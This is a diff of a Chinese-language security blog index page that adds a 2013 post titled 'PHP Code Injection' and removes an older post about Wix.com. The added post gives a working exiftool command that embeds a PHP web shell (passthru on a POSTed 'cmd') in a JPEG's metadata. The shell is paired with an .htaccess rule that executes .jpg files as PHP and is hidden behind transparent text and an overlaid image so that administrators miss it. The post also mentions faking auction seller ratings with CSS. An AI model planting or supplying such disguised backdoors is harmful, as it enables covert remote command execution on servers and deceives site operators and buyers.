@@ -10,7 +10,7 @@
   <meta name="author" content="atdog">
 
   
-  <meta name="description" content="Convert AAC to MP3 format ffmpeg -i input.m4a -acodec mp3 -ac 2 -ab 128 output.mp3 Batch convert for i in *.m4a; do ffmpeg -i "$i" -acodec mp3 -ac 2 &hellip;">
+  <meta name="description" content="先前提到的 Exiftool 可以用來修改Image Metadata Tag的資料。 但當網頁加入 .htaccess AddHandler application/x-httpd-php .jpg 會導致讀取 http://target/image.jpg 以html/txt去讀取， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -78,6 +78,101 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/05/11/php-code-injection/">PHP Code Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-11T10:50:00+08:00" pubdate data-updated="true">May 11<span>th</span>, 2013</time>
+        
+         | <a href="/blog/2013/05/11/php-code-injection/#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>先前提到的 <a href="/blog/2013/02/27/image-exif-tool/">Exiftool</a> 可以用來修改Image Metadata Tag的資料。</p>
+
+<p>但當網頁加入 .htaccess</p>
+
+<pre><code>AddHandler  application/x-httpd-php .jpg
+</code></pre>
+
+<p>會導致讀取 http://target/image.jpg 以html/txt去讀取，</p>
+
+<p>雖然因此能正確執行php，不過要是有其他使用者/管理者來檢查，</p>
+
+<p>發現讀取 http://target/image.jpg 都是亂碼，不就漏餡了嘛？</p>
+
+<p>如圖</p>
+
+<p><img src="/images/imageup1.png" title="image upload" alt="image upload" /></p>
+
+<p>所以就想了個trick來掩蓋這個問題，</p>
+
+<p>透過html css，將亂碼字設成透明，並加入&lt;img&gt;tag來讓圖片「看起來」是正常的</p>
+
+<pre><code>exiftool -DocumentName='&lt;?php if(!isset($_POST[cmd])) {echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";}else{passthru($_POST[cmd]);} __halt_compiler();?&gt;' apple.jpg
+</code></pre>
+
+<p>當中的PHP  code是這樣子的，</p>
+
+<pre><code>&lt;?php 
+    if(!isset($_POST[cmd])) {
+        echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;"
+        echo "&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";
+    }else{
+        passthru($_POST[cmd]);
+    } 
+    __halt_compiler();
+?&gt;
+</code></pre>
+
+<p>若直接瀏覽圖片網址，如圖，會顯示出一個圖片</p>
+
+<p><img src="/images/phpinject1.png" title="phpinjectimage" alt="phpinject1" /></p>
+
+<p>只有當 POST cmd=XX 到頁面上時，才會正確執行passthru($cmd)！</p>
+
+<p><img src="/images/phpinject2.png" title="phpinjectimage" alt="phpinject2" /></p>
+
+<hr />
+
+<p>其實這個想法就跟淘寶前陣子很多人在用的漏洞一樣，</p>
+
+<p>使用者可以自定義CSS，而導致透過CSS來假造賣家評價，來騙取使用者，</p>
+
+<p>前陣子我和<a href="http://blog.dm4.tw">dm4</a> 在Yahoo 拍賣也透過一樣的手法，</p>
+
+<p>來做過評價的偽裝，雖然簡單但可以騙取到不少使用者的信任。</p>
+</div>
+  
+  
+
+
+<div style="z-index:999999; position:absolute;">
+    <fb:recommendations-bar action="like" max_age="0" num_recommendations="3" read_time="4" side="right" site="http://blog.atdog.org" trigger="40%"/>
+</div>
+
+    </article>
   
   
     <article>
@@ -512,108 +607,6 @@ addhandler application/x-httpd-php .jpg
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/02/27/wix-dot-com/">Wix.com</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-02-27T12:41:00+08:00" pubdate data-updated="true">Feb 27<span>th</span>, 2013</time>
-        
-         | <a href="/blog/2013/02/27/wix-dot-com/#disqus_thread">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://www.wix.com">Wix.com</a> 最近似乎在Facebook竄紅起來，</p>
-
-<p><img src="/images/wixcom.png" title="Wix com" alt="wixcom" /></p>
-
-<p>Wix主打提供使用者快速建立web site的功能，</p>
-
-<p>使用者僅需要用滑鼠做些基本的操作、或是會點flash，而不需有任何HTML的腦袋，</p>
-
-<p>就可以完成一樣不錯的作品，</p>
-
-<p>不過這邊要跟大家介紹一些Wix.com的小秘密，</p>
-
-<p>由於過度依賴這類網站很容易導致資安問題，</p>
-
-<hr />
-
-<p>現在的網路世界中，為了方便性，這樣的網站實在不少，</p>
-
-<p>以<a href="http://www.wix.com">Wix.com</a> 來說，</p>
-
-<p><code>26,756,521 sites created!</code></p>
-
-<p>從建立至今由使用者所建立的網站個數，</p>
-
-<p>雖然使用者建立的網站，以靜態網頁為主，</p>
-
-<p>不太會被攻擊者攻擊，大不了就DDOS，被攻擊過後，網站本身依舊活的好好的，</p>
-
-<p>反之，假設攻擊者攻陷的是<a href="http://www.wix.com">Wix.com</a> ，</p>
-
-<p>26,756,521個Sites就是死的。</p>
-
-<hr />
-
-<br>
-
-
-<p>最後如下&#8230;</p>
-
-<p><img src="/images/wix-backdoor.png" title="Wix backdoor" alt="wixbackdoor" /></p>
-
-<p>你確定你的Host端(Wix.com)，Security做的足夠嘛？</p>
-
-<hr />
-
-<br>
-
-
-<p>題外話，</p>
-
-<p>如果大家想知道一個網站是不是由Wix所建立，</p>
-
-<p>很簡單，</p>
-
-<p>在HTML原始碼中，可以看到Wix.com的js、images的link，</p>
-
-<p>甚至該Site的Wix.com的UID都可以在裡面找到，</p>
-
-<p>(有UID就可以做login bruteforce，甚至能做Cookie的偽造)</p>
-
-<p>這樣就可以快速的找到該Wix.com的使用者相關訊息了!</p>
-</div>
-  
-  
-
-
-<div style="z-index:999999; position:absolute;">
-    <fb:recommendations-bar action="like" max_age="0" num_recommendations="3" read_time="4" side="right" site="http://blog.atdog.org" trigger="40%"/>
-</div>
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/2/">&larr; Older</a>
@@ -629,6 +622,10 @@ addhandler application/x-httpd-php .jpg
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2013/05/11/php-code-injection/">PHP Code Injection</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2013/04/10/audio-conversion/">audio conversion</a>
       </li>
     
@@ -642,10 +639,6 @@ addhandler application/x-httpd-php .jpg
     
       <li class="post">
         <a href="/blog/2013/02/27/image-exif-tool/">Image exif tool</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2013/02/27/wix-dot-com/">Wix.com</a>
       </li>
     
   </ul>
